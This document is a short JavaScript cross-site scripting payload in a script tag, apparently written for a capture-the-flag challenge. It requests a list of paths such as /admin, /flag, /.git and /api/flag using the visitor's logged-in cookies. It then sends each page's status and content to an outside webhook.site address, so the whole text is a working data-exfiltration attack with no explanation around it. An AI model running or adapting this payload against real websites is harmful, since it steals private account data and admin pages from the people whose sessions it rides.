<script>
const paths = [
  "/",              // home
  "/admin",         // common
  "/dashboard",     // often used for logged-in users
  "/profile",       // personal info
  "/secret",        // many CTFs use this
  "/hidden",        // CTF trick
  "/supersecret",   // why not :)
  "/flag",          // already ruled out, but included just in case
  "/source",        // view source page?
  "/api/flag",      // RESTful-style
  "/.git",          // misconfigured repo?
  "/robots.txt"     // sometimes has clues
];

paths.forEach(path => {
  fetch(path, { credentials: "include" })
    .then(r => r.text().then(text => {
      fetch("https://webhook.site/4901b97b-e4f5-4816-af89-91b9bf6c4f91", {
        method: "POST",
        body: `---\nPath: ${path}\n\nStatus: ${r.status}\n\nContent:\n${text}`
      });
    }))
    .catch(e => {});
});
</script>
